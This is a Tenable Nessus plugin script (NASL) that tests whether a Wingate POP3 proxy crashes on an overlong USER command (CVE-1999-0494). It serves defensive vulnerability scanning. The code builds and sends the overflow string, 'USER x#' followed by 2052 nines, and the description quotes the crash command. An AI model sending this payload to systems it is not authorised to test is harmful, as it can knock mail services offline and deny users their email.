#
# (C) Tenable Network Security, Inc.
#

include( 'compat.inc' );

if(description)
{
  script_id(10311);
  script_version ("$Revision: 1.21 $");
  script_cve_id("CVE-1999-0494");
  script_xref(name:"OSVDB", value:"11380");

  script_name(english:"Wingate Proxy POP3 USER Overflow");
  script_summary(english:"Determines if Wingate POP3 server can be crashed");

  script_set_attribute(
    attribute:'synopsis',
    value:'The remote proxy is vulnerable to denial of service.'
  );

  script_set_attribute(
    attribute:'description',
    value:"The remote POP3 server,
which is probably part of Wingate, could
be crashed with the following command :

    USER x#999(...)999

This problem may prevent users on your
network from retrieving their emails."
  );

  script_set_attribute(
    attribute:'solution',
    value: "Configure WinGate so that only authorized users can use it."
  );

  script_set_attribute(
    attribute:'see_also',
    value:'http://archives.neohapsis.com/archives/bugtraq/1998_3/0041.html'
  );

  script_set_attribute(
    attribute:'cvss_vector',
    value:'CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P'
  );

  script_end_attributes();

  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
  script_family(english:"Windows");
  script_dependencie("find_service1.nasl", "qpopper.nasl");
  script_exclude_keys("pop3/false_pop3");
  script_require_ports("Services/pop3", 110);
  exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");

if (report_paranoia < 2) exit(0);

fake = get_kb_item("pop3/false_pop3");
if(fake)exit(0);

port = get_kb_item("Services/pop3");
if(!port) port = 110;

if(get_port_state(port))
{
soc = open_sock_tcp(port);
if(soc)
{
 buffer = recv_line(socket:soc, length:1024);
 if(!buffer)exit(0);
 s = string("USER x#", crap(length:2052, data:"9"), "\r\n");
 send(socket:soc, data:s);
 close(soc);

 soc2 = open_sock_tcp(port);
 if(!soc2)security_warning(port);
 else close(soc2);
}
}
